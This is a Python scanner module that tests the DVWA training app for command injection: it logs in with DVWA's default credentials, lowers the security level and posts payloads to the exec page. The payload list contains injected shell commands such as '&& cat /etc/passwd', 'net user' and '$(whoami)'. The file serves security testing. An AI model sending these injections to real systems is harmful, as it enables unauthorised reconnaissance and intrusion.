# src/scanners/command_injection.py
"""
Command Injection Scanner Module
"""
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from src.utils.logger import setup_logger

class CommandInjectionScanner:
    def __init__(self, session, target_url, verbose=False):
        self.session = session
        self.target_url = target_url
        self.verbose = verbose
        self.logger = setup_logger(verbose)
        self.vulnerabilities_found = []
        
        # Command injection payloads for different operating systems
        self.payloads = [
            # Basic command injection
            "; whoami",
            "| whoami", 
            "&& whoami",
            "|| whoami",
            
            # File system commands
            "; ls",
            "| ls -la",
            "&& cat /etc/passwd",
            "|| dir",
            
            # Network commands
            "; ifconfig",
            "| ipconfig",
            "&& ping -c 1 localhost",
            
            # System info
            "; uname -a",
            "| systeminfo",
            "&& ps aux",
            
            # Windows specific
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "&& net user",
            
            # Blind command injection indicators
            "; sleep 5",
            "| ping -c 5 127.0.0.1",
            "&& sleep 5",
            
            # Special characters that might break commands
            "`whoami`",
            "$(whoami)",
            "'; whoami; '",
            '\"; whoami; \"',
        ]

    def dvwa_login(self):
        """
        Login to DVWA with proper CSRF token handling
        Returns: Boolean - True if login successful
        """
        try:
            self.logger.info("🔐 Attempting to login to DVWA...")
            
            login_url = urljoin(self.target_url, "/login.php")
            
            # First, get the login page to capture CSRF token
            get_response = self.session.get(login_url)
            
            if get_response.status_code != 200:
                self.logger.error(f"❌ Failed to access login page. Status: {get_response.status_code}")
                return False
            
            # Parse the HTML to find CSRF token
            soup = BeautifulSoup(get_response.text, 'html.parser')
            csrf_token_input = soup.find('input', {'name': 'user_token'})
            
            if not csrf_token_input:
                self.logger.error("❌ Could not find CSRF token on login page")
                return False
                
            csrf_token = csrf_token_input.get('value')
            self.logger.debug(f"📋 Found CSRF token: {csrf_token}")
            
            # Prepare login data
            login_data = {
                "username": "admin",
                "password": "password", 
                "Login": "Login",
                "user_token": csrf_token
            }
            
            # Submit login form
            post_response = self.session.post(login_url, data=login_data)
            
            # Check if login was successful
            if "Login failed" in post_response.text:
                self.logger.error("❌ Login failed - Incorrect username/password")
                return False
            elif "PHPSESSID" in self.session.cookies:
                self.logger.info("✅ Successfully logged into DVWA")
                
                # Set security level to low
                self.set_dvwa_security_low()
                return True
            else:
                self.logger.error("❌ Login failed - Unknown reason")
                return False
                
        except Exception as e:
            self.logger.error(f"💥 Login error: {str(e)}")
            return False

    def set_dvwa_security_low(self):
        """
        Set DVWA security level to low for testing
        """
        try:
            security_url = urljoin(self.target_url, "/security.php")
            
            # Get security page
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find CSRF token
            csrf_token_input = soup.find('input', {'name': 'user_token'})
            if not csrf_token_input:
                self.logger.warning("⚠️ Could not find CSRF token on security page")
                return
                
            csrf_token = csrf_token_input.get('value')
            
            # Set security to low
            security_data = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": csrf_token
            }
            
            response = self.session.post(security_url, data=security_data)
            
            if "Security level is currently: low" in response.text:
                self.logger.info("✅ DVWA security level set to LOW")
            else:
                self.logger.warning("⚠️ Could not verify security level change")
                
        except Exception as e:
            self.logger.warning(f"⚠️ Could not set security level: {str(e)}")

    def test_dvwa_command_injection_page(self):
        """Test DVWA's Command Injection vulnerability page"""
        self.logger.info("🎯 Testing DVWA Command Injection page...")
        self.vulnerabilities_found = []
        
        # Login first
        if not self.dvwa_login():
            self.logger.error("🚫 Cannot proceed without DVWA login")
            return False
        
        # Test command injection page
        ci_url = urljoin(self.target_url, "/vulnerabilities/exec/")
        vulnerabilities_found = 0
        
        # Test payloads for the IP parameter
        test_payloads = [
            "127.0.0.1",  # Normal input
            "127.0.0.1; whoami",  # Basic injection
            "127.0.0.1 | whoami",  # Pipe injection
            "127.0.0.1 && whoami",  # AND injection
            "127.0.0.1 || whoami",  # OR injection
            "google.com; whoami",  # Domain with injection
        ]
        
        for payload in test_payloads:
            try:
                self.logger.debug(f"🧪 Testing payload: {payload}")
                
                # Send request with payload
                data = {"ip": payload, "Submit": "Submit"}
                response = self.session.post(ci_url, data=data)
                
                # Check for successful injection
                if self.is_command_injection_successful(response.text, payload):
                    self.logger.warning(f"💉 COMMAND INJECTION VULNERABILITY FOUND!")
                    self.logger.warning(f"   Payload: {payload}")
                    self.logger.warning(f"   URL: {ci_url}")
                    # Track the finding
                    self.vulnerabilities_found.append({
                        "payload": payload,
                        "url": ci_url,
                        "type": "Command Injection"
                    })
                    vulnerabilities_found += 1
                    
            except Exception as e:
                self.logger.error(f"❌ Error testing payload {payload}: {str(e)}")
        
        if vulnerabilities_found > 0:
            self.logger.warning(f"🎯 Found {vulnerabilities_found} Command Injection vulnerabilities!")
            return True
        else:
            self.logger.info("✅ No Command Injection vulnerabilities detected")
            return False

    def is_command_injection_successful(self, response_text, payload):
        """
        Detect if command injection was successful based on response.
        Avoids flagging normal ping output as a vulnerability.
        """
        # Step 1: If the payload contains no injection operators, it's benign
        injection_operators = [';', '|', '&', '&&', '||', '`', '$(']
        if not any(op in payload for op in injection_operators):
            return False

        # Indicators that suggest actual command execution (beyond normal ping)
        injection_indicators = [
            # User/account names
            "www-data", "root", "administrator", "nt authority", "daemon", "bin", "sys",
            "apache", "httpd", "nginx", "nobody",
            # File contents
            "etc/passwd", "root:", "Directory of", "Volume in drive",
            # File permissions
            "drwx", "-rw-r--r--",
            # Command outputs
            "uid=", "gid=", "groups=", "whoami", "uname", "id=",
            # System info
            "Linux", "Windows", "Microsoft", "C:\\\\", "\\etc\\",
        ]

        # Normal ping output (not indicative of injection)
        ping_indicators = [
            "Pinging", "bytes from", "packets:", "statistics", "Average", "time="
        ]

        # Check for injection indicators first
        for indicator in injection_indicators:
            if indicator.lower() in response_text.lower():
                self.logger.debug(f"   Found injection indicator: {indicator}")
                return True

        # If only ping output is present, do not flag
        for indicator in ping_indicators:
            if indicator.lower() in response_text.lower():
                self.logger.debug("   Only ping output detected - not flagging")
                return False

        # No relevant indicators found
        return False